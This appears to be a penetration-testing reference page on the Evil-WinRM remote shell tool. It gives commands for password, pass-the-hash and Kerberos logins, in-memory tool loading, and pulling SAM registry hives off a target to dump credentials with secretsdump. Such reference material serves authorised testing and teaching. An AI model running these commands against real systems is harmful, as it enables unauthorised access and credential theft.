# Evil-WinRM

> The go-to interactive shell for Windows Remote Management (WinRM). Given valid
> credentials — or just an NTLM hash — it gives you a fully featured remote
> PowerShell session with built-in upload/download and in-memory script loading.

- **Link:** https://github.com/Hackplayers/evil-winrm
- **Type:** open source
- **Platform:** cross-platform (Ruby)

## Description

When a host exposes WinRM (TCP **5985**/HTTP or **5986**/HTTPS) and you hold a
credential for an account in the *Remote Management Users* or *Administrators*
group, Evil-WinRM logs you in much like SSH. On top of a plain PowerShell prompt
it adds convenience commands: `upload`/`download` for file transfer, `menu` to
list helpers, and loaders that pull PowerShell scripts or .NET assemblies
straight into memory (handy for running tools without touching disk). It
supports password auth, **pass-the-hash**, and Kerberos tickets.

## Installation

```bash
# Preinstalled on Kali; otherwise via the gem
sudo apt install evil-winrm
gem install evil-winrm
```

## Usage examples

```bash
# Log in with a username and password
evil-winrm -i 10.0.0.5 -u jsmith -p 'Passw0rd!'

# Pass-the-hash — authenticate with an NTLM hash instead of a password
evil-winrm -i 10.0.0.5 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Kerberos auth using a ticket in your cache
evil-winrm -i dc01.corp.local -u administrator -r corp.local

# Serve local scripts/executables into the session (-s scripts, -e binaries)
evil-winrm -i 10.0.0.5 -u administrator -p 'Passw0rd!' -s /opt/tools/ -e /opt/bins/
```

Inside the session:

```powershell
# Pull a file back to your attacker box (e.g. exported registry hives)
download C:\Windows\Temp\sam.bin sam.bin

# Push a tool to the target
upload winPEASx64.exe

# List the built-in helper commands
menu
```

## Notes & references

- Check WinRM access first with [NetExec](netexec.md):
  `nxc winrm <target> -u <user> -p <pass>` — `Pwn3d!` means you can log in.
- A classic loot flow: `reg save` the SAM/SECURITY/SYSTEM hives on the host,
  `download` them, then run `impacket-secretsdump ... LOCAL` (see
  [Impacket](impacket.md) and the AD workflow in this category's README).
- Docs: https://github.com/Hackplayers/evil-winrm/blob/master/README.md
